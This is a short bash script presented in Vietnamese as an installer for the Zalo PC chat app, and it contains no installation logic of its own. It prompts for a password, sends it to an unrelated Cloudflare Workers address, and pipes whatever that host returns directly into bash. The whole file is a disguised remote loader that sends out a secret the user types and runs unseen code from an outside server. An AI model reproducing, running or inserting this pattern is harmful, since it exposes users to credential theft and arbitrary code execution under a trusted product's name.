#!/usr/bin/env bash

set -e

WORKER_URL="https://private-script-sentosa.cloud07622.workers.dev"

echo "================================"
echo "        CÀI ĐẶT ZALO PC"
echo "================================"
echo

read -rsp "Nhập mật khẩu: " PASSWORD
echo
echo

# Gửi password đến Cloudflare Worker
RESPONSE=$(curl -fsSL \
    -X POST \
    -H "Content-Type: application/json" \
    --data "$(printf '%s' "$PASSWORD" | python3 -c '
import sys
import json
print(json.dumps({"password": sys.stdin.read()}))
')" \
    "$WORKER_URL")

# Xóa password khỏi biến môi trường hiện tại
unset PASSWORD

# Chạy script private
printf '%s\n' "$RESPONSE" | bash
